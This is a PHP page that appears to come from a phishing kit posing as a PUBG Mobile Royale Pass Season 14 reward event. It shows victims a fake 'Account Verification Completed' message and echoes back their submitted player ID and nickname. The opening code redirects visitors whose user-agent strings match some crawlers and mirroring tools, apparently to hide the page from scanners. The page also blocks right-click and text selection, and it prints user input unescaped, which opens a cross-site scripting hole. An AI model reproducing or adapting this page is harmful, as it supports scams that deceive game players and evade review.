<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
//MENGAMBIL SISTEM SCRIPT
include 'system/setting.php';

//MENERIMA DATA YANG DI-INPUT
$playid = $_POST['playid'];
$nick = $_POST['nick'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($playid == "" && $nick == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">

<div class="navbar">
<div class="navbar-btn-wrapper">
<i class="fa fa-bars fa-2x"></i>
<button class="navbar-btn">
Purchase</button>
<button class="navbar-btn">
Download</button>
</div>
<img src="img/icon.jpg">
<div class="navbar-txt-game">
PUBG MOBILE
<span>ROYALE PASS 14</span>
</div>
</div>

<div class="content">

<div class="notify">
<i class="zmdi zmdi-check-circle"></i>
<div class="notify-title">Account Verification Completed</div>
<div class="notify-description">Hi <?php echo $nick;?> your account has been process</div>
</div>

<div class="message">
Thank you for your enthusiasm at the Royale Pass Season 14: Spark The Flame event
<br>
The rewards you have chosen is currently being processed and will be sent to your account within 24 hours
<br>
Please wait until the sending process is complete, if the rewards has been sent you will get an automatic message from our team
<br>
<br>
Here below is the account of the rewards recipient's account:
<br>
Character ID: <?php echo $playid;?>
<br>
Character Name: <?php echo $nick;?>
<br>
Will be received in: 24 hours
<br>
<br>
<center>
Keep playing PUBG MOBILE and get Winner Winner Chicken Dinner!
</center>
</div>

<button type="button" class="btn-verify" onclick="location.href='/';">Logout my Account</button>

</div> <!--- content --->
</div> <!--- container mask --->
</div> <!--- container --->

</body>
</html>